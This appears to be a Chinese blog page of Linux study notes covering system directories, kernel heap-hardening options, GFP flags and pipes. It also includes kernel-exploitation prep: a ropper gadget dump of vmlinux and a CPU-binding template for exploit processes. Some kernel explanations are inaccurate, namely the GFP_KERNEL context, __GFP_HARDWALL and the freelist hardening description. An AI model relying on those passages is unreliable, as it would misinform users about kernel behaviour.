title="lib文件"></a>lib文件</h2><p>在类Unix操作系统中，<code>/lib</code>目录是一个关键的系统目录，用于存放操作系统运行所需的基本共享库文件和内核模块。这些库文件对于系统的正常运行至关重要，因为它们提供了许多基本的功能，供不同的程序和服务调用。以下是对<code>/lib</code>目录的详细解释：</p><h3 id="lib目录的作用"><a href="#lib目录的作用" class="headerlink" title="/lib目录的作用"></a><code>/lib</code>目录的作用</h3><ul><li><strong>共享库</strong>：<code>/lib</code>目录包含了系统最基本的共享库文件，这些文件类似于Windows操作系统中的DLL文件。它们提供了许多常用的功能，如文件操作、数学计算、字符串处理等，可以被系统中的多个程序共同使用。</li><li><strong>内核模块</strong>：<code>/lib</code>目录还存放了内核模块（在<code>/lib/modules</code>目录下），这些模块可以在系统运行时动态加载或卸载，用于支持硬件设备、文件系统类型等。</li></ul><h3 id="lib目录的特点"><a href="#lib目录的特点" class="headerlink" title="/lib目录的特点"></a><code>/lib</code>目录的特点</h3><ul><li><strong>核心依赖</strong>：<code>/lib</code>目录中的文件是系统启动和运行的核心依赖。例如，即使是最基本的命令行工具，如<code>ls</code>或<code>bash</code>，也需要调用<code>/lib</code>目录中的库文件来执行。</li><li><strong>动态链接</strong>：存放在<code>/lib</code>目录中的共享库文件通常是动态链接的，意味着程序在运行时才会加载这些库文件。这种方式可以减少程序的磁盘和内存占用，因为多个程序可以共享同一份库文件，而不是每个程序都包含自己的库副本。</li></ul><h3 id="lib目录下的重要子目录"><a href="#lib目录下的重要子目录" class="headerlink" title="/lib目录下的重要子目录"></a><code>/lib</code>目录下的重要子目录</h3><ul><li>**<code>/lib32</code>和<code>/lib64</code>**：在64位系统中，<code>/lib</code>目录可能会包含<code>/lib32</code>和<code>/lib64</code>子目录，分别用于存放32位和64位的库文件。这样做是为了保持对32位应用程序的兼容性。</li><li>**<code>/lib/modules</code>**：存放内核模块的目录，这些模块可以根据需要动态加载到内核中。</li></ul><h3 id="注意事项-1"><a href="#注意事项-1" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>系统稳定性</strong>：由于<code>/lib</code>目录包含了系统的核心库文件，任何对这些文件的不当修改都可能导致系统不稳定或无法启动。</li><li><strong>安全性</strong>：库文件是攻击者常见的攻击目标之一，因为它们通常具有高权限且被广泛使用。因此，保持系统和库文件的更新是非常重要的。</li></ul><p>总的来说，<code>/lib</code>目录是类Unix操作系统中非常关键的一个组成部分，它为系统提供了核心的共享库和内核模块，使得系统能够高效地运行各种程序和服务。</p><h2 id="proc文件"><a href="#proc文件" class="headerlink" title="proc文件"></a>proc文件</h2><p>在类Unix操作系统中，<code>/proc</code>目录是一个特殊的目录，它并不存储在磁盘上，而是一个虚拟的文件系统，通常被称为proc文件系统。<code>/proc</code>提供了一个窗口，通过它可以查看运行中的内核和进程信息，以及修改某些内核参数。这个目录包含了大量的信息，既包括关于系统硬件的详细信息，也包括关于当前运行的进程的信息。以下是对<code>/proc</code>目录的详细解释：</p><h3 id="proc目录的作用"><a href="#proc目录的作用" class="headerlink" title="/proc目录的作用"></a><code>/proc</code>目录的作用</h3><ul><li><strong>内核参数访问</strong>：<code>/proc</code>目录允许用户和应用程序访问和修改内核参数。例如，<code>/proc/sys</code>目录下的文件可以用来动态调整内核的行为。</li><li><strong>进程信息</strong>：对于系统上的每个进程，<code>/proc</code>都有一个以进程ID命名的子目录，例如<code>/proc/1234</code>。这些目录包含了关于各个进程的详细信息，如内存映射、打开的文件描述符、进程状态等。</li><li><strong>系统信息</strong>：<code>/proc</code>目录提供了关于系统硬件和配置的信息，例如CPU信息（<code>/proc/cpuinfo</code>）、内存信息（<code>/proc/meminfo</code>）、分区表（<code>/proc/partitions</code>）等。</li></ul><h3 id="proc目录的特点"><a href="#proc目录的特点" class="headerlink" title="/proc目录的特点"></a><code>/proc</code>目录的特点</h3><ul><li><strong>虚拟的</strong>：<code>/proc</code>是一个虚拟文件系统，它存在于内存中，不占用磁盘空间。这意味着其中的文件和目录是由内核动态生成的，以提供关于系统状态的实时信息。</li><li><strong>可读写</strong>：虽然大多数<code>/proc</code>下的文件是只读的，但有些文件是可写的，允许通过直接写入这些文件来修改内核参数。</li><li><strong>实时性</strong>：<code>/proc</code>目录下的信息是实时更新的，反映了当前系统的状态。</li></ul><h3 id="proc目录下的一些重要文件和目录"><a href="#proc目录下的一些重要文件和目录" class="headerlink" title="/proc目录下的一些重要文件和目录"></a><code>/proc</code>目录下的一些重要文件和目录</h3><ul><li><strong><code>/proc/cpuinfo</code><strong>：显示</strong>CPU的信息</strong>，如型号、核心数、速度等。</li><li><strong><code>/proc/meminfo</code><strong>：显示</strong>内存的详细使用信息</strong>，包括总内存、可用内存、缓存等。</li><li><strong><code>/proc/partitions</code><strong>：显示系统中</strong>所有分区</strong>的列表。</li><li><strong><code>/proc/sys</code><strong>：包含可以</strong>动态调整的内核参数</strong>。通过修改这里的文件，可以改变系统的行为。</li><li><strong><code>/proc/[pid]</code><strong>：每个正在运行的进程都有一个对应的目录，目录名为进程的PID。这些目录</strong>包含了关于进程的详细信息</strong>。</li></ul><h3 id="注意事项-2"><a href="#注意事项-2" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>安全性</strong>：由于<code>/proc</code>目录提供了大量的系统信息和部分内核参数修改能力，恶意程序可能会尝试读取这些信息或修改参数以提升权限或进行攻击。因此，系统管理员需要留意对<code>/proc</code>目录的访问控制。</li><li><strong>性能影响</strong>：频繁地访问或修改某些<code>/proc</code>文件可能会对系统性能产生影响，特别是在高负载情况下。</li></ul><p>总的来说，<code>/proc</code>目录是一个功能强大的工具，为系统管理员和开发者提供了一种方便的方式来监控和调整系统运行时的行为。</p><h2 id="sbin文件"><a href="#sbin文件" class="headerlink" title="sbin文件"></a>sbin文件</h2><p>在类Unix操作系统中，<code>/sbin</code>目录是一个存放系统管理和维护程序的特殊目录。这个目录包含的程序通常是供系统管理员使用的，而不是普通用户。这些程序包括用于启动、修复、恢复和维护系统的各种工具。与<code>/bin</code>目录下的命令相比，<code>/sbin</code>目录下的命令更多地关注系统级别的操作和维护任务。以下是对<code>/sbin</code>目录的详细解释：</p><h3 id="sbin目录的作用"><a href="#sbin目录的作用" class="headerlink" title="/sbin目录的作用"></a><code>/sbin</code>目录的作用</h3><ul><li><strong>系统启动和恢复</strong>：<code>/sbin</code>目录包含了启动系统所需的重要命令，如<code>init</code>、<code>systemd</code>或<code>upstart</code>。这些是系统初始化和管理服务的核心工具。</li><li><strong>设备管理</strong>：这个目录下的命令包括用于管理硬件设备的程序，比如<code>fdisk</code>、<code>mkfs</code>、<code>fsck</code>等，它们分别用于分区、格式化和检查文件系统。</li><li><strong>网络配置</strong>：<code>/sbin</code>还包含了配置网络的工具，例如<code>ifconfig</code>（尽管在一些现代的Linux发行版中，<code>ifconfig</code>已经被<code>ip</code>命令替代，并且可能位于<code>/bin</code>或<code>/usr/bin</code>目录）。</li><li><strong>系统安全</strong>：包括用于设置和管理系统安全方面的命令，如<code>iptables</code>用于配置防火墙规则。</li></ul><h3 id="sbin目录的特点"><a href="#sbin目录的特点" class="headerlink" title="/sbin目录的特点"></a><code>/sbin</code>目录的特点</h3><ul><li><strong>专业性</strong>：与<code>/bin</code>目录下的命令相比，<code>/sbin</code>目录下的命令更加专业，主要面向系统管理和维护。</li><li><strong>访问限制</strong>：出于安全考虑，这些命令通常只有root用户或具有相应权限的用户才能执行。这是为了防止普通用户执行可能会影响系统稳定性和安全性的操作。</li></ul><h3 id="注意事项-3"><a href="#注意事项-3" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>谨慎使用</strong>：由于<code>/sbin</code>目录下的命令具有很高的权限和强大的功能，不当的使用可能会导致系统不稳定甚至数据丢失。因此，只有在清楚命令作用的情况下才使用这些命令。</li><li><strong>路径问题</strong>：在一些系统中，特别是在非root用户下，<code>/sbin</code>目录可能不在默认的环境变量<code>PATH</code>中。如果需要执行<code>/sbin</code>目录下的命令，可能需要指定完整的路径或临时修改<code>PATH</code>变量。</li></ul><p>总的来说，<code>/sbin</code>目录是类Unix操作系统中非常重要的一个目录，它包含了许多系统级别的管理和维护工具。了解和合理使用这些工具对于系统管理员来说非常重要。</p><h2 id="sys文件"><a href="#sys文件" class="headerlink" title="sys文件"></a>sys文件</h2><p>在类Unix操作系统中，<code>/sys</code>目录是一个虚拟文件系统，称为sysfs。sysfs提供了一种机制，使得内核空间能够将信息导出到用户空间，从而允许用户空间的程序和用户查询和控制内核中的设备和驱动程序的状态。与<code>/proc</code>文件系统相似，<code>/sys</code>也不占用磁盘空间，它在系统启动时由内核动态生成。以下是对<code>/sys</code>目录的详细解释：</p><h3 id="sys目录的作用"><a href="#sys目录的作用" class="headerlink" title="/sys目录的作用"></a><code>/sys</code>目录的作用</h3><ul><li><strong>设备和驱动程序信息</strong>：<code>/sys</code>提供了一种查看和交互式修改与系统硬件设备相关的信息的方法。每个硬件设备在<code>/sys</code>中都有一个对应的目录，通过这个目录，可以访问设备的属性、状态以及相关的驱动程序信息。</li><li><strong>内核对象（kobjects）表示</strong>：sysfs使用内核对象（kobjects）来表示内核中的各种结构，如设备、驱动程序和内核模块。这为用户提供了一种直观的方式来浏览和修改这些对象的属性。</li><li><strong>系统配置</strong>：除了提供设备信息，<code>/sys</code>还允许某些参数的动态修改，这可以影响系统的运行方式和设备的配置。</li></ul><h3 id="sys目录的特点"><a href="#sys目录的特点" class="headerlink" title="/sys目录的特点"></a><code>/sys</code>目录的特点</h3><ul><li><strong>虚拟的</strong>：与<code>/proc</code>一样，<code>/sys</code>是一个虚拟文件系统，它反映了内核的当前状态，但不占用实际的磁盘空间。</li><li><strong>结构化</strong>：<code>/sys</code>的结构比<code>/proc</code>更加直观和有组织，它按照设备类型和功能进行组织，使得查找特定设备或信息更加容易。</li><li><strong>可读写</strong>：<code>/sys</code>中的许多文件不仅可读，也可写。这允许用户或应用程序通过写入这些文件来改变设备的状态或配置。</li></ul><h3 id="sys目录下的一些重要子目录"><a href="#sys目录下的一些重要子目录" class="headerlink" title="/sys目录下的一些重要子目录"></a><code>/sys</code>目录下的一些重要子目录</h3><ul><li>**<code>/sys/block</code>**：包含系统中所有块设备的信息，如硬盘和光驱。</li><li>**<code>/sys/class</code>**：按设备类型组织的设备信息，如<code>/sys/class/net</code>包含网络接口的信息。</li><li>**<code>/sys/devices</code>**：包含系统中所有设备的层次结构，这是按照物理或逻辑结构组织的。</li><li>**<code>/sys/module</code>**：包含当前加载的内核模块信息。</li></ul><h3 id="注意事项-4"><a href="#注意事项-4" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>谨慎修改</strong>：虽然<code>/sys</code>提供了修改设备配置和参数的能力，但不恰当的修改可能会导致系统不稳定或硬件设备工作异常。因此，在修改<code>/sys</code>中的文件之前，应确保了解这些修改的含义和后果。</li><li><strong>权限</strong>：修改<code>/sys</code>中的文件通常需要管理员权限，因为这些更改可能会影响系统的整体运行。</li></ul><p>总的来说，<code>/sys</code>目录是Linux内核提供的一种强大的机制，用于展示系统硬件信息和配置，它为用户和程序提供了直接与内核交互的能力。</p><h2 id="tmp文件"><a href="#tmp文件" class="headerlink" title="tmp文件"></a>tmp文件</h2><p>在类Unix操作系统中，<code>/tmp</code>目录是一个用于存放临时文件的特殊目录。这个目录供系统和用户存放在短期内需要的文件，但这些文件随后可能会被删除或丢弃。<code>/tmp</code>目录对所有用户都是可写的，因此它是多用户环境下共享临时数据的一个常用位置。以下是对<code>/tmp</code>目录的详细解释：</p><h3 id="tmp目录的作用"><a href="#tmp目录的作用" class="headerlink" title="/tmp目录的作用"></a><code>/tmp</code>目录的作用</h3><ul><li><strong>临时数据存储</strong>：<code>/tmp</code>提供了一个存储临时数据的地方，这些数据包括但不限于临时文件、处理中的数据文件、缓存文件等。</li><li><strong>程序执行中间产物</strong>：很多程序在执行过程中会产生临时文件，这些文件用于存储中间结果或日志信息，执行完毕后通常会被删除。</li><li><strong>用户和应用程序的临时文件</strong>：除了系统进程外，用户启动的应用程序也可能会在<code>/tmp</code>中创建临时文件，用于各种临时需求。</li></ul><h3 id="tmp目录的特点"><a href="#tmp目录的特点" class="headerlink" title="/tmp目录的特点"></a><code>/tmp</code>目录的特点</h3><ul><li><strong>易失性</strong>：<code>/tmp</code>目录中的数据是易失的，这意味着在系统重启过程中，存储在其中的文件可能会被删除。一些系统在启动时会自动清理<code>/tmp</code>目录，而其他系统可能会运行定期的清理任务。</li><li><strong>安全性</strong>：由于<code>/tmp</code>是对所有用户可写的，因此存在一定的安全风险。恶意用户或程序可能会尝试利用<code>/tmp</code>目录中的文件执行攻击，或通过创建大量文件耗尽系统资源。</li><li><strong>权限管理</strong>：系统通常会对<code>/tmp</code>目录设置特定的权限和粘滞位（sticky bit），以防止用户删除或修改不属于他们的文件。</li></ul><h3 id="注意事项-5"><a href="#注意事项-5" class="headerlink" title="注意事项"></a>注意事项</h3><ul><li><strong>定期清理</strong>：由于<code>/tmp</code>用于存放临时文件，建议定期清理以释放磁盘空间，尤其是在磁盘空间较小的系统上。</li><li><strong>安全措施</strong>：在使用<code>/tmp</code>时，应该注意安全性，避免在其中存储敏感信息。同时，开发者在创建临时文件时应使用安全的方法，如使用<code>mktemp</code>命令或相应的库函数来创建唯一的临时文件名，以减少安全风险。</li><li><strong>替代方案</strong>：对于需要长期存储的临时文件，应考虑使用其他目录，如用户的主目录下的临时文件夹，或者系统提供的其他临时存储位置，例如<code>/var/tmp</code>。与<code>/tmp</code>不同，<code>/var/tmp</code>在系统重启后通常不会被清空。</li></ul><p>总的来说，<code>/tmp</code>目录是一个用于存放临时文件的便利位置，但使用时需要注意数据的易失性和安全性问题。合理管理<code>/tmp</code>目录对于维护系统的稳定性和安全性非常重要。</p><h1 id="进程的创建"><a href="#进程的创建" class="headerlink" title="进程的创建"></a>进程的创建</h1><p>一个进程的创建可以发生在以下几种情况下：</p><ol><li>系统启动： 当计算机系统启动时，会自动创建一个或多个进程作为系统的初始进程。这些初始进程通常是操作系统内核的一部分，负责初始化系统资源、加载驱动程序和启动其他进程。</li><li>程序执行： 当执行一个可执行程序时，操作系统会创建一个新的进程来运行该程序。这个新创建的进程称为子进程，而执行程序的进程称为父进程。子进程是父进程的副本，它会继承父进程的代码、数据和资源，并开始执行程序的指令。</li><li>调用fork()函数： 通过调用系统调用函数<code>fork()</code>，一个进程可以创建一个与自身相同的副本，即父进程和子进程。调用<code>fork()</code>函数后，当前进程会复制自身，创建一个全新的进程作为子进程，而原始进程则继续执行。父进程和子进程在调用<code>fork()</code>之后同时执行，但是它们可以根据<code>fork()</code>的返回值来区分自己的角色。</li><li>调用exec()函数： 通过调用系统调用函数<code>exec()</code>，一个进程可以加载并执行一个新的可执行程序。<code>exec()</code>函数会替换当前进程的代码和数据，并开始执行新程序的指令。使用<code>exec()</code>函数创建的进程不是通过复制父进程而创建的，而是直接加载新的程序。</li></ol><p>需要注意的是，进程的创建并不是立即发生的，而是在操作系统调度时才会真正创建和执行。操作系统根据调度策略和优先级来决定进程的创建和运行顺序。</p><h1 id="补充汇编知识"><a href="#补充汇编知识" class="headerlink" title="补充汇编知识"></a>补充汇编知识</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xchg rax rsp：交换rax和rsp的值</span><br><span class="line">dec ebx：ebx自减<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="补充某些保护"><a href="#补充某些保护" class="headerlink" title="补充某些保护"></a>补充某些保护</h1><ul><li><code>CONFIG_MEMCG_KMEM</code>：使得<code>GFP_KERNEL</code> 与 <code>GFP_KERNEL_ACCOUNT</code> 会从不一样的 <code>kmalloc-xx</code> 中进行分配</li><li><code>CONFIG_RANDOMIZE_KSTACK_OFFSET</code>：这使得固定函数调用到内核栈底的偏移值是变化的</li><li><code>SLAB_FREELIST_HARDENED</code>：这使得 freelist 有保护，不能随意控制</li><li><code>HARDENED_FREELIST</code>：该机制通过以下方式提高自由链表的安全性：<ol><li>随机化指针：<code>HARDENED_FREELIST</code>会对自由链表中的指针进行随机化处理，使攻击者难以预测或修改指针的值。这样可以防止攻击者利用已知的指针偏移或地址来修改自由链表的指针。</li><li>校验和保护：<code>HARDENED_FREELIST</code>会使用校验和来验证自由链表中的指针是否被篡改。通过计算和验证校验和，可以检测指针是否被修改，从而防止攻击者对自由链表进行恶意修改。</li><li>隔离和分割：<code>HARDENED_FREELIST</code>会将自由链表与其他内存区域进行隔离和分割，以减少攻击者对自由链表的访问和修改机会。这种隔离和分割可以通过物理或虚拟内存布局来实现。</li></ol></li><li><code>RANDOMIZE_FREELIST</code>：可以提供以下安全性优势：<ol><li>防止指针猜测：攻击者通常会尝试猜测或推断自由链表中的指针值，以便修改它们以控制内存分配。通过随机化指针，攻击者无法准确猜测指针的值，从而增加攻击的困难度。</li><li>减少重复利用：某些堆漏洞（如双重释放）可能导致攻击者重复利用自由链表中的已释放内存块。通过随机化自由链表指针，可以降低攻击者成功利用重复利用漏洞的概率。</li></ol></li></ul><h1 id="补充某些内核的知识"><a href="#补充某些内核的知识" class="headerlink" title="补充某些内核的知识"></a>补充某些内核的知识</h1><h2 id="GFP-KERNEL"><a href="#GFP-KERNEL" class="headerlink" title="GFP_KERNEL"></a>GFP_KERNEL</h2><p><code>GFP_KERNEL</code> 是 Linux 内核中用于内存分配的标志之一，它表示在内核中申请内存时使用的标志。</p><p>GFP 代表 “Get Free Page”，它是内核中用于分配页面（Page）的函数 <code>__alloc_pages()</code> 和 <code>kmalloc()</code> 的标志参数之一。<code>GFP_KERNEL</code> 是其中最常用的标志之一，它表示常规的内核内存分配。</p><p>使用 <code>GFP_KERNEL</code> 标志进行内存分配意味着：</p><ol><li>内存分配是针对内核使用的，而不是用户空间。</li><li>内存分配是在常规内核上下文中进行的，例如进程上下文或中断上下文。</li><li>内存分配是可睡眠的，即如果没有足够的可用内存，调用者可能会被置于睡眠状态，直到有足够的内存可用。</li></ol><p><code>GFP_KERNEL</code> 标志通常用于在内核中进行常规的内存分配，例如数据结构的动态分配、缓存的分配等。它提供了一种默认的内存分配策略，适用于大多数内核代码的需求。</p><h2 id="GFP-HARDWALL"><a href="#GFP-HARDWALL" class="headerlink" title="__GFP_HARDWALL"></a>__GFP_HARDWALL</h2><p><code>__GFP_HARDWALL</code> 是 Linux 内核中的一个内存分配标志，用于在内核中进行内存分配时设置特定的行为。</p><p><code>__GFP_HARDWALL</code> 标志的作用是在内存分配过程中强制执行硬壁（hardwall）策略。硬壁策略是一种内存分配的安全机制，用于防止内存资源的过度消耗。</p><p>当使用 <code>__GFP_HARDWALL</code> 标志进行内存分配时，内核会采取以下行为：</p><ol><li>限制内存分配的数量：内核会限制每个进程或上下文中的内存分配数量，以防止资源过度消耗。</li><li>强制等待：如果没有足够的可用内存，内核会强制等待，直到有足够的内存可用，而不是尝试其他的内存回收或压缩策略。</li></ol><p>通过使用 <code>__GFP_HARDWALL</code> 标志，内核可以确保内存分配不会无限制地消耗系统资源，从而提高系统的可靠性和稳定性。这对于关键任务和资源受限环境下的系统特别重要。</p><h2 id="GFP-NOWARN"><a href="#GFP-NOWARN" class="headerlink" title="__GFP_NOWARN"></a>__GFP_NOWARN</h2><p><code>__GFP_NOWARN</code> 是 Linux 内核中的一个内存分配标志，用于在内核中进行内存分配时设置特定的行为。</p><p><code>__GFP_NOWARN</code> 标志的作用是禁止内核在内存分配失败时发出警告或打印错误消息。通常，当内存分配失败时，内核会发出警告或打印错误消息，以提醒开发人员或系统管理员可能存在的问题。</p><p>使用 <code>__GFP_NOWARN</code> 标志进行内存分配时，内核会执行以下行为：</p><ol><li>禁止警告信息：内核不会发出警告或打印错误消息，即使内存分配失败。</li><li>返回 NULL 或错误码：内核可能会返回 NULL 指针或特定的错误码，以表示内存分配失败，而不是发出警告消息。</li></ol><h1 id="一些指令"><a href="#一些指令" class="headerlink" title="一些指令"></a>一些指令</h1><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ropper --file ./vmlinux --nocolor &gt; g1</span><br><span class="line">sudo ./tiqu.sh bzImage &gt; vmlinux</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//将 exp 进程绑定至指定核心的模板：</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sched.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* to run the exp on the specific core only */</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">bind_cpu</span><span class="params">(<span class="type">int</span> core)</span>   <span class="comment">//xp中直接调用该函数，core=0 ........</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">cpu_set_t</span> cpu_set;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;cpu_set);</span><br><span class="line">    CPU_SET(core, &amp;cpu_set);</span><br><span class="line">    sched_setaffinity(getpid(), <span class="keyword">sizeof</span>(cpu_set), &amp;cpu_set);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="提取vmlinux的脚本"><a href="#提取vmlinux的脚本" class="headerlink" title="提取vmlinux的脚本"></a>提取vmlinux的脚本</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="comment"># SPDX-License-Identifier: GPL-2.0-only</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"># extract-vmlinux - Extract uncompressed vmlinux from a kernel image</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># Inspired from extract-ikconfig</span></span><br><span class="line"><span class="comment"># (c) 2009,2010 Dick Streefland &lt;dick@streefland.net&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># (c) 2011      Corentin Chary &lt;corentin.chary@gmail.com&gt;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># ----------------------------------------------------------------------</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">check_vmlinux</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># Use readelf to check if it&#x27;s a valid ELF</span></span><br><span class="line"><span class="comment"># <span class="doctag">TODO:</span> find a better to way to check that it&#x27;s really vmlinux</span></span><br><span class="line"><span class="comment">#       and not just an elf</span></span><br><span class="line">readelf -h <span class="variable">$1</span> &gt; /dev/null 2&gt;&amp;1 || <span class="built_in">return</span> 1</span><br><span class="line"></span><br><span class="line"><span class="built_in">cat</span> <span class="variable">$1</span></span><br><span class="line"><span class="built_in">exit</span> 0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">try_decompress</span></span>()</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"># The obscure use of the &quot;tr&quot; filter is to work around older versions of</span></span><br><span class="line"><span class="comment"># &quot;grep&quot; that report the byte offset of the line instead of the pattern.</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Try to find the header ($1) and decompress from here</span></span><br><span class="line"><span class="keyword">for</span>pos <span class="keyword">in</span> `<span class="built_in">tr</span> <span class="string">&quot;<span class="variable">$1</span>\n<span class="variable">$2</span>&quot;</span> <span class="string">&quot;\n<span class="variable">$2</span>=&quot;</span> &lt; <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | grep -abo <span class="string">&quot;^<span class="variable">$2</span>&quot;</span>`</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">pos=<span class="variable">$&#123;pos%%:*&#125;</span></span><br><span class="line"><span class="built_in">tail</span> -c+<span class="variable">$pos</span> <span class="string">&quot;<span class="variable">$img</span>&quot;</span> | <span class="variable">$3</span> &gt; <span class="variable">$tmp</span> 2&gt; /dev/null</span><br><span class="line">check_vmlinux <span class="variable">$tmp</span></span><br><span class="line"><span class="keyword">done</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># Check invocation:</span></span><br><span class="line">me=<span class="variable">$&#123;0##*/&#125;</span></span><br><span class="line">img=<span class="variable">$1</span></span><br><span class="line"><span class="keyword">if</span>[ <span class="variable">$#</span> -ne 1 -o ! -s <span class="string">&quot;<span class="variable">$img</span>&quot;</span> ]</span><br><span class="line"><span class="keyword">then</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;Usage: <span class="variable">$me</span> &lt;kernel-image&gt;&quot;</span> &gt;&amp;2</span><br><span class="line"><span class="built_in">exit</span> 2</span><br><span class="line"><span class="keyword">fi</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Prepare temp files:</span></span><br><span class="line">tmp=$(<span class="built_in">mktemp</span> /tmp/vmlinux-XXX)</span><br><span class="line"><span class="built_in">trap</span> <span class="string">&quot;rm -f <span class="variable">$tmp</span>&quot;</span> 0</span><br><span class="line"></span><br><span class="line"><span class="comment"># That didn&#x27;t work, so retry after decompression.</span></span><br><span class="line">try_decompress <span class="string">&#x27;\037\213\010&#x27;</span> xy    gunzip</span><br><span class="line">try_decompress <span class="string">&#x27;\3757zXZ\000&#x27;</span> abcde unxz</span><br><span class="line">try_decompress <span class="string">&#x27;BZh&#x27;</span>          xy    bunzip2</span><br><span class="line">try_decompress <span class="string">&#x27;\135\0\0\0&#x27;</span>   xxx   unlzma</span><br><span class="line">try_decompress <span class="string">&#x27;\211\114\132&#x27;</span> xy    <span class="string">&#x27;lzop -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;\002!L\030&#x27;</span>   xxx   <span class="string">&#x27;lz4 -d&#x27;</span></span><br><span class="line">try_decompress <span class="string">&#x27;(\265/\375&#x27;</span>   xxx   unzstd</span><br><span class="line"></span><br><span class="line"><span class="comment"># Finally check for uncompressed images or objects:</span></span><br><span class="line">check_vmlinux <span class="variable">$img</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Bail out:</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;<span class="variable">$me</span>: Cannot find vmlinux.&quot;</span> &gt;&amp;2</span><br></pre></td></tr></table></figure><h1 id="管道"><a href="#管道" class="headerlink" title="管道"></a>管道</h1><p><a href="https://blog.csdn.net/oguro/article/details/53841949">linux管道pipe详解_linux pipe-CSDN博客</a></p><h3 id="管道的概念："><a href="#管道的概念：" class="headerlink" title="管道的概念："></a>管道的概念：</h3><p>管道是一种最基本的IPC机制，作用于有血缘关系的进程之间，完成数据传递。调用pipe系统函数即可创建一个管道。有如下特质：</p><ol><li>其本质是一个伪文件(实为内核缓冲区)</li><li>由两个文件描述符引用，一个表示读端，一个表示写端。</li><li>规定数据从管道的写端流入管道，从读端流出。</li></ol><p>管道的原理: 管道实为内核使用环形队列机制，借助内核缓冲区(4k)实现。</p><p>管道的局限性：</p><p>① 数据自己读不能自己写。</p><p>② 数据一旦被读走，便不在管道中存在，不可反复读取。</p><p>③ 由于管道采用半双工通信方式。因此，数据只能在一个方向上流动。</p><p>④ 只能在有公共祖先的进程间使用管道。</p><p>常见的通信方式有，单工通信、半双工通信、全双工通信。</p><h3 id="pipe函数"><a href="#pipe函数" class="headerlink" title="pipe函数"></a>pipe函数</h3><p>创建管道</p><p>  <code>int pipe(int pipefd[2]); 成功：0；失败：-1，设置errno</code></p><p>函数调用成功返回r&#x2F;w两个文件描述符。无需open，但需手动close。规定：fd[0] → r； fd[1] → w，就像0对应标准输入，1对应标准输出一样。向管道文件读写数据其实是在读写内核缓冲区。</p><p>管道创建成功以后，创建该管道的进程（父进程）同时掌握着管道的读端和写端。如何实现父子进程间通信呢？通常可以采用如下步骤：</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202404282213695.png" alt="img"> 